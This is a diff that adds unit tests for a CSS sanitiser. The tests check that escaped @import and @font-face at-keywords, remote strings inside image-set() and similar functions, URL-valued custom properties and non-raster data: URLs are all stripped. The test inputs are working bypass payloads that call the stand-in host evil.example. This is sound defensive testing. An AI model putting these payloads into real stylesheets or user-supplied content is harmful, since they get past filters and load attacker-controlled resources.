@@ -197,4 +197,141 @@ describe('sanitiseAndScopeCss — saiku#1942 control-char-split url() scheme byp
 		const out = sanitiseAndScopeCss('.a{background:url(data:image/png;base64,AA)}', ROOT);
 		expect(out).toContain('data:image/png');
 	});
+
+	// saiku#1944 F1 — css-tree does not decode CSS escapes in an at-rule NAME,
+	// so an escaped at-keyword reached the browser as @import while the
+	// denylist compared the raw `\69 mport`.
+	test('drops @import hidden behind a CSS-escaped at-keyword (url form)', () => {
+		const out = sanitiseAndScopeCss(
+			'@\\69 mport url(https://evil.example/x.css);\n.a{color:red}',
+			ROOT
+		);
+		expect(out.toLowerCase()).not.toContain('@import');
+		expect(out.toLowerCase()).not.toContain('evil.example');
+		expect(out).toContain(`${ROOT} .a`);
+	});
+
+	test('drops @import hidden behind a CSS-escaped at-keyword (string form)', () => {
+		const out = sanitiseAndScopeCss(
+			'@\\69 mport "https://evil.example/x.css";\n.a{color:red}',
+			ROOT
+		);
+		expect(out.toLowerCase()).not.toContain('@import');
+		expect(out.toLowerCase()).not.toContain('evil.example');
+	});
+
+	test('drops @import whose at-keyword is split by a 6-digit hex escape', () => {
+		const out = sanitiseAndScopeCss(
+			'@\\000069mport url(https://evil.example/x.css);\n.a{color:red}',
+			ROOT
+		);
+		expect(out.toLowerCase()).not.toContain('@import');
+		expect(out.toLowerCase()).not.toContain('evil.example');
+	});
+
+	test('drops @font-face hidden behind a CSS-escaped at-keyword', () => {
+		const out = sanitiseAndScopeCss(
+			'@\\66 ont-face{font-family:x;src:url(https://evil.example/f.woff2)}',
+			ROOT
+		);
+		expect(out.toLowerCase()).not.toContain('@font-face');
+		expect(out.toLowerCase()).not.toContain('evil.example');
+	});
+
+	test('anti-regression: a conditional at-rule is kept and its rules still scoped', () => {
+		const out = sanitiseAndScopeCss('@media (min-width:1px){.a{color:red}}', ROOT);
+		expect(out.toLowerCase()).toContain('@media');
+		expect(out).toContain(`${ROOT} .a`);
+	});
+
+	// saiku#1944 F2 — image-set() takes a bare <string>, so a remote URL in one
+	// is a remote load the url() layer never sees.
+	test('drops a remote bare string inside image-set()', () => {
+		const out = sanitiseAndScopeCss(
+			'.a{background:image-set("https://evil.example/x.png" 1x)}',
+			ROOT
+		);
+		expect(out).not.toContain('evil.example');
+	});
+
+	test('drops a remote bare string inside -webkit-image-set()', () => {
+		const out = sanitiseAndScopeCss(
+			'.a{background:-webkit-image-set("https://evil.example/x.png" 1x)}',
+			ROOT
+		);
+		expect(out).not.toContain('evil.example');
+	});
+
+	test('drops a protocol-relative bare string inside image-set()', () => {
+		const out = sanitiseAndScopeCss(".a{background:image-set('//evil.example/x.png' 1x)}", ROOT);
+		expect(out).not.toContain('evil.example');
+	});
+
+	test('drops a remote bare string inside image() / src()', () => {
+		const out = sanitiseAndScopeCss(
+			'.a{background:image("https://evil.example/x.png")} .b{cursor:src("https://evil.example/x.cur")}',
+			ROOT
+		);
+		expect(out).not.toContain('evil.example');
+	});
+
+	test('drops a remote bare string hidden behind a ) inside an earlier string', () => {
+		const out = sanitiseAndScopeCss(
+			'.a{content:")" ; background:image-set("https://evil.example/x.png" 1x)}',
+			ROOT
+		);
+		expect(out).not.toContain('evil.example');
+	});
+
+	test('drops a custom property weaponised as an image-set() string', () => {
+		const out = sanitiseAndScopeCss(
+			'.a{--x:"https://evil.example/x.png";background:image-set(var(--x) 1x)}',
+			ROOT
+		);
+		expect(out).not.toContain('evil.example');
+	});
+
+	test('anti-regression: a data:image bare string inside image-set() is allowed', () => {
+		const out = sanitiseAndScopeCss(
+			'.a{background:image-set("data:image/png;base64,AA" 1x)}',
+			ROOT
+		);
+		expect(out).toContain('data:image/png');
+	});
+
+	test('anti-regression: a relative bare string inside image-set() is allowed', () => {
+		const out = sanitiseAndScopeCss('.a{background:image-set("img/logo.png" 1x)}', ROOT);
+		expect(out).toContain('img/logo.png');
+	});
+
+	test('anti-regression: a non-URL string in a custom property is allowed', () => {
+		const out = sanitiseAndScopeCss('.a{--label:"Hello, world";content:var(--label)}', ROOT);
+		expect(out).toContain('Hello, world');
+	});
+
+	test('anti-regression: label copy that looks scheme-ish stays in a custom property', () => {
+		const out = sanitiseAndScopeCss(
+			'.a{--kpi-label:"Revenue: total";content:var(--kpi-label)}',
+			ROOT
+		);
+		expect(out).toContain('Revenue: total');
+	});
+
+	test('drops a custom property holding a protocol-relative URL string', () => {
+		const out = sanitiseAndScopeCss(
+			'.a{--x:"//evil.example/x.png";background:image-set(var(--x) 1x)}',
+			ROOT
+		);
+		expect(out).not.toContain('evil.example');
+	});
+
+	// saiku#1944 F3 — align with echartsOption's ALLOWED_DATA_IMAGE: a `data:`
+	// payload that is not a raster image is not allowed in a stylesheet.
+	test('drops a non-raster data: url()', () => {
+		const out = sanitiseAndScopeCss(
+			'.a{background:url("data:image/svg+xml,<svg/>")} .b{background:url("data:text/html,<b>")}',
+			ROOT
+		);
+		expect(out).not.toContain('data:');
+	});
 });
